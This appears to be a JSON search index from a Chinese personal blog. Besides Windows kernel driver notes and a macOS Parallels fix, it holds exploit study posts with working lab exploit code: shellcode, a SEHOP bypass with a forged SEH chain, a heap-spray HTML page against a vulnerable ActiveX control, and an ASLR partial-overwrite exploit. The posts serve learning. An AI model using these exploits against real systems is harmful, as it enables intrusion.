ObReferenceObjectByHandle(hOpenEvent, EVENT_ALL_ACCESS, *ExEventObjectType, KernelMode, &amp;amp;pOpenEventObject, NULL); if (pOpenEventObject == NULL) { break; } DbgPrint(&quot;[%ws] Create Handle:%p, Create Object Address:%p\\n&quot;, __FUNCTIONW__, hCreateEvent, pCreateEventObject); DbgPrint(&quot;[%ws] Open Handle:%p, Open Object Address:%p\\n&quot;, __FUNCTIONW__, hOpenEvent, pOpenEventObject); bSucc = TRUE; } while (FALSE); if (pCreateEventObject == NULL) { ObDereferenceObject(pCreateEventObject); pCreateEventObject = NULL; } if (hCreateEvent == NULL) { ZwClose(hCreateEvent); hCreateEvent = NULL; } if (pOpenEventObject == NULL) { ObDereferenceObject(pOpenEventObject); pOpenEventObject = NULL; } if (hOpenEvent == NULL) { ZwClose(hOpenEvent); hOpenEvent = NULL; }} 一个小小的坑：在导入头文件的时候发生冲突：ntddk.h和ntifs.h，解决办法是将ntifs.h放到ntddk.h的前面导入，这样就没有冲突了注册表 注册表其实是Windows的配置存储结构，存储着系统绝大部分的配置信息，其中大多数文件存储在系统盘下SYSTEM32\\CONFIG目录下，这些文件以内存映射方式存储在内核空间中，然后以“HIVE”的方式组织起来，注册表API实际上操作的是HIVE内存数据，最终会写回到config目录下对应的文件中去打开与关闭 未完待续" }, { "title": "Windows内核学习笔记-001", "url": "/posts/Windows%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-001/", "categories": "Kernel", "tags": "Windows, Kernel", "date": "2020-12-18 18:52:00 +0800", "snippet": "这波啊，这波是又从头学起了，之前学的内核有些不系统，这次一定系统地整理一遍Windows内核编程的内容本文来源：Moeomu的博客Windows内核开发环境配置下载 开发机 Windows 10 20H2 x64 Visual Studio 2019 Windows Driver Kit - Windows 10.0.19041.685(Windows 10 2004) WinDbg Preview 测试机 Windows 10 2004 x64 DbgView测试驱动程序 还是使用最经典的HelloWorld来作为开始吧#include &amp;lt;ntddk.h&amp;gt;VOID DriverUnload(PDRIVER_OBJECT DriverObject){ DbgPrint(&quot;[%ws] Driver Unload, Driver Object Address: %p\\n&quot;, __FUNCTIONW__, DriverObject);}NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath){ DbgPrint(&quot;[%ws] Hello Kernel World!\\n&quot;, __FUNCTIONW__); if (DriverObject != NULL) { DbgPrint(&quot;[%ws] Driver Object Address: %p\\n&quot;, __FUNCTIONW__, DriverObject); DriverObject-&amp;gt;DriverUnload = DriverUnload; } if (RegistryPath != NULL) { DbgPrint(&quot;[%ws] Driver Registry Path: %wZ\\n&quot;, __FUNCTIONW__, RegistryPath); } return STATUS_SUCCESS;}测试调试 参考Windows内核调试一文来布置调试环境，只不过将Windows7的地方改成Windows10即可上下文环境解析 上下文指的是CPU在执行代码时，改代码所处的环境与状态。实验：PsGetCurrentProcessId 实验目的是为了找出所写出的驱动模块究竟在哪个“进程”中执行#include &amp;lt;ntddk.h&amp;gt;VOID DriverUnload(PDRIVER_OBJECT DriverObject){ DbgPrint(&quot;[%ws] Driver Unload, Driver Object Address: %p, Current Process Id=0x%p\\n&quot;, __FUNCTIONW__, DriverObject, PsGetCurrentProcessId());}NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath){ DbgPrint(&quot;[%ws] Hello Kernel World, Current Process Id=0x%p\\n&quot;, __FUNCTIONW__, PsGetCurrentProcessId()); if (DriverObject != NULL) { DbgPrint(&quot;[%ws] Driver Object Address: %p\\n&quot;, __FUNCTIONW__, DriverObject); DriverObject-&amp;gt;DriverUnload = DriverUnload; } if (RegistryPath != NULL) { DbgPrint(&quot;[%ws] Driver Registry Path: %wZ\\n&quot;, __FUNCTIONW__, RegistryPath); } return STATUS_SUCCESS;} 如图结论 无论是驱动入口函数还是驱动卸载回调函数都隶属于ID为4的进程，此进程为System进程 System进程是操作系统虚拟出来的一个进程，代表系统内核 驱动和应用层上下文应当严格区分，若进程A运行在P1虚拟空间内，而驱动当前的CPU上下文是P2的虚拟空间，那么访问到的内容应当是不可预料的中断请求级别 与线程的优先级的概念类似，系统调度器以时间片为粒度调度，根据线程的优先级来调度线程，线程优先级越高，获得调度的机会越大。而在驱动层，CPU提供了IRQL的概念，规定高IRQL级别的代码可以中断、抢占低IRQL的代码的执行过程，从而执行。常见的IRQL中断请求级别表 IRQL 数值(x86, amd64, IA64) 描述 PASSIVE_LEVEL 0, 0, 0 应用层线程以及大部分内核函数处于该IRQL，可与无限制使用所有内核API，可以访问分页以及非分页内存 APC_LEVEL 1, 1, 1 异步方法调用(APC)，或者页错误时处于该IRQL，可以使用大部分内核API，可以访问分页以及非分页内存 DISPATCH_LEVEL 2, 2, 2 延迟方法调用(DPC)时处于该IRQL，可以使用特定的内核API，只能访问非分页内存 判断当前IRQL 在驱动程序入口点DriverEntry，IRQL为PASSIVE_LEVEL，这是系统保证的 通过调用KeGetCurrentIrql函数来获取当前的IRQL 如图所示，IRQL都是0，对照上表，级别是PASSIVE_LEVEL]结论 在调用某个函数之前首先看清楚函数说明文档，仔细观察安全调用函数的IRQL级别是什么，以此来实现安全编程驱动异常 开发驱动时，若驱动程序代码编写不合规引发系统崩溃的情况，表现为蓝屏(BSOD)。常见原因 高IRQL死锁 内存访问违规 函数堆栈不平衡主动引发蓝屏 可以使用KeBugCheckEx函数主动引发蓝屏结论 在代码发生不可预知错误时，主动引发蓝屏可以减少进一步扩大错误" }, { "title": "macOS-pd16修复网络", "url": "/posts/macOS-pd16%E4%BF%AE%E5%A4%8D%E7%BD%91%E7%BB%9C/", "categories": "Other", "tags": "macOS, Other", "date": "2020-12-16 13:42:00 +0800", "snippet": "macOS-parallels desktop网络初始化失败解决办法本文来源：Moeomu的博客前奏 在macOS Big Sur下可以使用 之前是使用命令启动的不完美解决办法，还会导致一系列权限问题，现在终于完美了解决方案 最高权限编辑文件/Library/Preferences/Parallels/network.desktop.xml 将UseKextless字段的值从-1改为0 注意：这个值可能并不是所有人-1，也可能并不是所有人改为0都行，勇于尝试嘛" }, { "title": "漏洞学习笔记-021-保护下的堆", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-021-%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-11-28 16:15:00 +0800", "snippet": "堆的保护和攻击本文来源：Moeomu的博客简介 PEB Random：微软在Windows XP SP2之后不再使用固定的PEB基址0x7ffdf000，而是使用具有一定随机性的PEB基址。PEB随机化之后主要影响了对PEB中函数的攻击，在DWORD SHOOT的时候，PEB中的函数指针是绝佳的目标，移动PEB基址将在一定程度上给这类攻击增加难度。覆盖PEB中函数指针的利用方式请参见堆溢出利用中的实验和攻击PEB中的函数指针的相关介绍 SafeUnlink：微软改写了操作双向链表的代码，在卸载free list中的堆块时更加小心。对照堆溢出利用-DWORD SHOOT中关于双向链表拆卸问题的描述，在SP2之前的链表拆卸操作类似于如下代码：int remove(ListNode * node){ node -&amp;gt; blink -&amp;gt; flink = node -&amp;gt; flink; node -&amp;gt; flink -&amp;gt; blink = node -&amp;gt; blink; return 0;} SP2 在进行删除操作时，将提前验证堆块前向指针和后向指针的完整性，以防止发生DWORD SHOOT：int safe_remove(ListNode * node){ if((node-&amp;gt;blink-&amp;gt;flink == node) &amp;amp;&amp;amp; (node-&amp;gt;flink-&amp;gt;blink == node)) { node -&amp;gt; blink -&amp;gt; flink = node -&amp;gt; flink; node -&amp;gt; flink -&amp;gt; blink = node -&amp;gt; blink; return 1; } else { // 链表指针被破坏，进入异常 return 0; }} heap cookie：栈中的security cookie类似，微软在堆中也引入了cookie，用于检测堆溢出的发生。cookie被布置在堆首部分原堆块的segment table的位置，占1个字节大小 元数据加密：微软在Windows Vista及后续版本的操作系统中开始使用该安全措施。块首中的一些重要数据在保存时会与一个4字节的随机数进行异或运算，在使用这些数据时候需要再进行一次异或运行来还原，这样我们就不能直接破坏这些数据了，以达到保护堆的目的。攻击思路攻击堆内存储的变量 这样的方法是攻击堆内存储的函数指针之类的方法实现溢出，但是和堆本身并没有什么关系利用chunk重设大小攻击堆原理 SafeUnlink在堆从freelist中卸下堆块的时候进行双链表有效性校验，但是将堆块插入freelist中的操作却没有校验时机 内存中释放堆块后，将会被插入空表 堆块的空间大于申请的空间，剩余的空间将被插入空表新chunk的插入过程 Flink：下一个节点；Blink：上一个节点；参见MSDN-NTDEF-LIST 新chunk-&amp;gt;Blink=旧chunk-&amp;gt;Flink-&amp;gt;Blink 旧chunk-&amp;gt;Flink-&amp;gt;Blink-&amp;gt;Flink=新chunk 旧chunk-&amp;gt;Flink-&amp;gt;Blink=新chunk 只要将旧chunk的Flink指针覆盖为地址，将Blink覆盖为值，就又可以进行DWORDSHOOT了代码未完待续" }, { "title": "漏洞学习笔记-020-SEHOP简介", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-020-SEHOP%E7%AE%80%E4%BB%8B/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-11-28 15:38:00 +0800", "snippet": "SEHOP的介绍和一点简单攻击本文来源：Moeomu的博客简介SEHOP的核心任务就是检查S.E.H链的完整性，在程序转入异常处理前SEHOP会检查S.E.H链上最后一个异常处理函数是否为系统固定的终极异常处理函数。如果是，则说明这条S.E.H链没有被破坏，程序可以去执行当前的异常处理函数；如果检测到最后一个异常处理函数不是，则说明S.E.H链被破坏，可能发生了S.E.H覆盖攻击，程序将不会去执行当前的异常处理函数 SEHOP验证伪代码if (process_flags &amp;amp; 0x40 == 0) // 如果没有SEH记录则不进行检测{ if (record != 0xFFFFFFFF) // 开始检测 { do { if (record &amp;lt; stack_bottom || record &amp;gt; stack_top) // SEH 记录必须位于栈中 goto corruption; if ((char *)record + sizeof(EXCEPTION_REGISTRATION) &amp;gt; stack_top) // SEH 记录结构需完全在栈中 goto corruption; if ((record &amp;amp; 3) != 0) // SEH记录必须4字节对齐 goto corruption; handler = record-&amp;gt;handler; if (handler &amp;gt;= stack_bottom &amp;amp;&amp;amp; handler &amp;lt; stack_top) // 异常处理函数地址不能位于栈中 goto corruption; record = record-&amp;gt;next; } while (record != 0xFFFFFFFF); // 遍历S.E.H链 } if ((TEB-&amp;gt;word_at_offset_0xFCA &amp;amp; 0x200) != 0) { if (handler != &amp;amp;FinalExceptionHandler) // 核心检测，地球人都知道，不解释了 goto corruption; }}攻击思路攻击返回地址 如果此函数启用了SEHOP但是没有启用GS或者函数刚好没有启用GS那么直接攻击返回地址即可攻击虚函数 SEHOP只保护SEH，但是虚函数表它并没有保护，攻击虚函数依旧可以成功利用未启用SEHOP的模块 微软为一些加密壳禁用了SEHOP，例如穿山甲Armadilo 操作系统会根据PE头中MajorLinkerVersion和MinorLinkerVersion两个选项来判断是否为程序禁用SEHOP。例如，我们可以将这两个选项分别设置为0x53和0x52来模拟经过Armadilo加壳的程序，从而达到禁用SEHOP的目的 Windows 7以及以后的系统中PEB_LDR_DATA指向的第二个模块被KernelBase.dll占据，所以shellcode应该修改一下Shellcode_for_windows7=&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09&quot;&quot;\\x8B\\x09&quot; // 在这增加机器码\\x8B\\x09，它对应的汇编为mov ecx,[ecx]&quot;\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot;;伪造SEH链表 前提：ASLR不启用 思路 通过未启用SafeSEH的SEH_NOSafeSEH_JUMP.dll来绕过SafeSEH 通过伪造S.E.H链，造成S.E.H链未被破坏的假象来绕过SEHOP SEH_NOSafeSEH中的test函数存在一个典型的溢出，即通过向str复制超长字符串造成str溢出，进而覆盖程序的S.E.H信息 使用SEH_NOSafeSEH_JUMP.DLL中的pop pop retn指令地址覆盖异常处理函数地址，然后通过制造除0异常，将程序转入异常处理 通过劫持异常处理流程，程序转入SEH_NOSaeSEH_JUMP.DLL中执行pop pop retn指令，在执行retn后程序转入shellcode执行 代码#include &amp;lt;string.h&amp;gt;#include &amp;lt;windows.h&amp;gt;char shellcode[] =&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x14\\xFF\\x12\\x00&quot; // address of last seh record&quot;\\x12\\x10\\x12\\x11&quot; // address of pop pop retn in No_SafeSEH module&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09&quot;&quot;\\x8B\\x09&quot; // 在这增加机器码\\x8B\\x09，它对应的汇编为mov ecx,[ecx]&quot;\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90&quot;&quot;\\xFF\\xFF\\xFF\\xFF&quot; // the fake seh record&quot;\\x75\\xA8\\xF7\\x77&quot;;DWORD MyException(void){ printf(&quot;There is an exception&quot;); getchar(); return 1;}void test(char * input){ char str[200]; memcpy(str, input, 412); int zero = 0; __try { zero = 1 / zero; } __except(MyException()){}}int main(){ HINSTANCE hInst = LoadLibrary(_T(&quot;SEH_NOSaeSEH_JUMP.dll&quot;)); // load No_SafeSEH module char str[200]; test(shellcode); return 0;}" }, { "title": "漏洞学习笔记-019-利用HeapSpray攻击ASLR", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8HeapSpray%E6%94%BB%E5%87%BBASLR/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-11-28 12:38:00 +0800", "snippet": "利用Heap Spray(堆喷射)技术来攻击ASLR并定位shellcode本文来源：Moeomu的博客原理通过申请大量的内存，占领内存中的0x0C0C0C0C的位置，并在这些内存中放置0x90和shellcode，最后控制程序转入0x0C0C0C0C执行。只要运气不要差到0x0C0C0C0C刚好位于shellcode中的某个位置，shellcode就可以成功执行实验准备工作 环境：系统：Windows Vista SP0，DEP状态：默认，浏览器：IE7 还是将之前用过的Vulner_AX.dll作为攻击目标 VulnerAX.idl中CVulnerAXCtrl的类信息的UUID：ACA3927C-6BD1-4B4E-8697-72481279AAEC思想 我们利用Heap spray技术在内存中申请200个1MB的内存块来对抗ASLR的随机化处理 每个内存块中包含着0x90填充和shellcode Heap spray结束后我们会占领0x0C0C0C0C附近的内存，我们只要控制程序转入0x0C0C0C0C执行，在经过若干个0x90滑行之后就可以到达shellcode范围并执行 test函数中存在一个典型的溢出漏洞，通过复制超长字符串可以覆盖函数返回地址 我们将函数返回地址覆盖为0x0C0C0C0C，在函数执行返回执行后就会转入我们申请的内存空间中代码&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;script&amp;gt; var nops = unescape(&quot;%u9090%u9090&quot;); var shellcode = &quot;\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\\u6853\\u616B\\u6F6F\\u4D68\\u7369\\u8B61\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857&quot;; while (nops.length &amp;lt; 0x100000) nops += nops; nops = nops.substring(0, 0x100000/2-32/2-4/2-2/2-shellcode.length); nops = nops + shellcode; var memory = new Array(); for (var i = 0; i &amp;lt; 200; i++) memory[i] += nops;&amp;lt;/script&amp;gt;&amp;lt;object classid=&quot;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC&quot; id=&quot;test&quot;&amp;gt; &amp;lt;/object&amp;gt;&amp;lt;script&amp;gt; var s = &quot;\\u9090&quot;; while (s.length &amp;lt; 54) { s += &quot;\\u9090&quot;; } s += &quot;\\u0C0C\\u0C0C&quot;; test.test(s);&amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;结果 成功攻击ASLR，如图" }, { "title": "漏洞学习笔记-018-利用部分覆盖定位", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-018-%E5%88%A9%E7%94%A8%E9%83%A8%E5%88%86%E8%A6%86%E7%9B%96%E5%AE%9A%E4%BD%8D/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-11-26 17:54:00 +0800", "snippet": "利用部分覆盖定位shellcode本文来源：Moeomu的博客原理 映像随机化指示对映像加载基址的全两个字节随机化处理，这样做的后果是跳板始终可用，因此可以利用这一点去绕过ASLR 如果攻击memcpy的话，可以将返回值控制在0xXXXX0000~0xXXXXFFFF之间，而攻击str类函数攻击，可以将控制地址为0xXXXX0100~0xXXXX00FF之间的一个过程 首先在编译完的程序内找到一条jmp eax的汇编码，随后将它的地址的低word作为off by word的地址，填入shellcode 计算好缓冲区大小，溢出后即可正常代码#include &amp;lt;memory.h&amp;gt;char shellcode[] =&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; // payload&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\x2A\\x23&quot; // off by word;char* test(){ char tt[256]; memcpy(tt, shellcode, 262); return tt;}int main(){ char temp[200]; test(); return 0;}开始实验 实验环境：系统：Windows Vista SP0，系统DEP状态：Optin默认，编译器：Visual Studio 2008，优化：禁用优化，GS选项：关闭，DEP选项：/NXCOMPAT:NO，build版本：release 编译程序，运行，直接弹出窗口并成功，重启也一样，如图" }, { "title": "漏洞学习笔记-017-ASLR简介", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-017-ASLR%E7%AE%80%E4%BB%8B/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-11-24 21:12:00 +0800", "snippet": "ASLR技术的介绍和简单攻击思路本文来源：Moeomu的博客ASLR技术简介 纵观前面介绍的所有漏洞利用方法都有着一个共同的特征：都需要确定一个明确的跳转地址。无论是JMP ESP等通用跳板指令还是Ret2Libc使用的各指令，我们都要先确定这条指令的入口点。所谓惹不起躲得起，微软的ASLR(Address Space Layout Randomization)技术就是通过加载程序的时候不再使用固定的基址加载，从而干扰shellcode定位的一种保护机制 实际上ASLR的概念在Windows XP时代就已经提出来了，只不过XP上面的ASLR功能很有限，只是对PEB和TEB进行了简单的随机化处理，而对于模块的加载基址没有进行随机化处理，直到Windows Vista出现后，ASLR才真正开始发挥作用 与SafeSEH类似ASLR的实现也需要程序自身的支持和操作系统的双重支持，其中程序的支持不是必需的 支持ASLR的程序在它的PE头中会设置IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识来说明其支持ASLR。微软从Visual Studio 2005 SP1开始加入了/dynamicbase链接选项来帮我们完成这个任务，我们只需要在编译程序的时候启用/dynmicbase链接选项，编译好的程序就支持ASLR了映像随机化 映像随机化是在PE文件映射到内存时，对其加载的虚拟地址进行随机化处理，这个地址是在系统启动时确定的，系统重启后这个地址会变化 可能是出于兼容性的考虑，微软在系统中设置了映像随机化的开关，用户可以通过设置注册表中HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SessionM anager\\MemoryManagement\\MoveImages的键值来设定映像随机化的工作模式 设置为0时映像随机化将禁用 设置为−1时强制对可随机化的映像进行处理，无论是否设置IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识 设置为其他值时为正常工作模式，只对具有随机化处理标识的映像进行处理 如果注册表中不存在MoveImages，大家可以手工建立名称为MoveImages，类型为DWORD的值，并根据需要设置它的值 堆栈随机化 这项措施是在程序运行时随机的选择堆栈的基址，与映像基址随机化不同的是堆栈的基址不是在系统启动的时候确定的，而是在打开程序的时候确定的，也就是说同一个程序任意两次运行时的堆栈基址都是不同的，进而各变量在内存中的位置也就是不确定的 将以下程序在VS2008中编译，在XP和Vista上分别运行两次，得到如下图的结果int main(){ char* heap = (char *)malloc(100); char stack[100]; printf(&quot;Address of heap:%#0.4x\\nAddress of stack:%#0.4x&quot;, heap, stack); getchar(); return 0;} 可以看出，Vista上堆地址相去甚远，而XP上完全相同PEB和TEB的随机化 获取当前进程的TEB和PEB很简单，TEB存放在FS:0和FS:[0x18]处，PEB存放在TEB偏移0x30的位置，可以通过如下代码来获取当前进程的TEB和PEBint main(){ unsigned int teb; unsigned int peb; __asm { mov eax, FS:[0x18] mov teb, eax mov eax, dword ptr[eax+0x30] mov peb, eax } printf(&quot;PEB:%#x\\nTEB:%#x&quot;, peb, teb); getchar(); return 0;} 在Vista上测试运行，结果如图 可以看出，效果非常差劲，PEB地址只随机化了一个字节，而且还是非常有规律，TEB基本没变过ASLR的缺陷 不难看出，ASLR随机化映像的时候，虽然模块的加载基址改变了，但是各个模块的入口点的低位两个字节是不会改变的，举例：原基址：0x00401234，随机化后基址变为：0x67291234，因此可以以此攻击它攻击未启用ASLR的模块准备工作 实验环境：Windows Vista SP0，IE7，Adobe Flash Player 9.0.124 虽然书上要求使用9.0.262版本，但是实在是找不到，就以9.0.124来替代了，点此下载 存在漏洞的OCX控件在之前的实验中已经编译了一个了，因此就使用那个了，点此下载，此控件ctrl class object id：ACA3927C-6BD1-4B4E-8697-72481279AAEC步骤 重启系统查看ASLR模块启用情况 实验控件未启用GS 通过IE7加载POC页面和Flash9k.ocx 函数test存在栈溢出漏洞，目标是覆盖函数的 返回地址 因为Flash9k.ocx未启用ASLR因此加载基址固定，可以在里面搜寻合适的跳板指令跳转到shellcode IE7的DEP是关闭的，因此不考虑DEP的影响 因为通过覆盖函数返回地址实现攻击，因此最佳的跳板指令是JMP ESP 0x301D606B也是JMP ESP，执行后将会跳转到字符串的头部，但是问题是6B 60 1D 30四个字节正好构成一句汇编指令imul esp,dword ptr ds:[eax+0x1D],0x30，它将会把后两个操作数相乘，随后放到第一个操作数中，因此需要保持[eax+0x1D]的值是正确的，而目前eax并未指向有效地址，因此需要修复eax 